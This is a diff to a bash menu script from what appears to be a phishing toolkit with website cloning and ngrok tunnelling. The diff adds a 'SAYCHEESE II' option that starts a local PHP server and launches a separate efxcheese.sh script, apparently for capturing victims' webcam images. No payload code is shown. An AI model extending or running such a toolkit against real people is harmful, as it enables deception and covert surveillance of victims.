@@ -27,7 +27,8 @@ echo -en "\e[1;31m[\e[0m\e[1;37m06\e[0m\e[1;31m]\e[0m\e[1;93m WEB CLONE AND HOST
 #Newends
 echo -en "\e[1;31m[\e[0m\e[1;37m07\e[0m\e[1;31m]\e[0m\e[1;93m UPDATE NGROK \e[0m\n"
 echo -en "\e[1;31m[\e[0m\e[1;37m08\e[0m\e[1;31m]\e[0m\e[1;93m CLOSE ALL CONNECTIONS \e[0m\n"
-echo -en "\e[1;31m[\e[0m\e[1;37m09\e[0m\e[1;31m]\e[0m\e[1;93m QUIT \e[0m\n"
+echo -en "\e[1;31m[\e[0m\e[1;37m09\e[0m\e[1;31m]\e[0m\e[1;93m SAYCHEESE II (new) \e[0m\n"
+echo -en "\e[1;31m[\e[0m\e[1;37m00\e[0m\e[1;31m]\e[0m\e[1;93m QUIT \e[0m\n"
 echo -en "[\e[0mENTER\e[1;92m] Please select your Requirement :"
 read input
 
@@ -128,7 +129,7 @@ cd -
   
 elif [[ $input == "8" || $input == "08" ]];
 then
-  killall -2 ngrok > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
 pkill -f -2 ngrok > /dev/null 2>&1
 killall -2 php > /dev/null 2>&1
 killall -2 ssh > /dev/null 2>&1
@@ -139,7 +140,26 @@ sleep 2
 echo -en "[\e[0m+\e[1;92m] Returning back to main menu \n"
 sleep 2
 ./run.sh
+#EFXCHEESE
 elif [[ $input == "9" || $input == "09" ]];
+then
+  killall -2 ngrok > /dev/null 2>&1
+pkill -f -2 ngrok > /dev/null 2>&1
+killall -2 php > /dev/null 2>&1
+killall -2 ssh > /dev/null 2>&1
+echo -en "[\e[0m+\e[1;92m] Please wait... \n"
+sleep 2
+printf "\e[1;31m[\e[0m\e[1;37m+\e[0m\e[1;31m]\e[0m\e[1;92m We are going to run SAYCHEESE... \e[0m\e[1;93m %s \n"
+sleep 3
+#ngrok http 6666
+cd efxcheese
+php -S localhost:6666 > /dev/null 2>&1 &
+bash efxcheese.sh
+
+
+#EFXCHEESEENDS
+
+elif [[ $input == "0" || $input == "00" ]];
 then
 sleep 2
 echo -en "[\e[0m+\e[1;92m] Thank you \n"
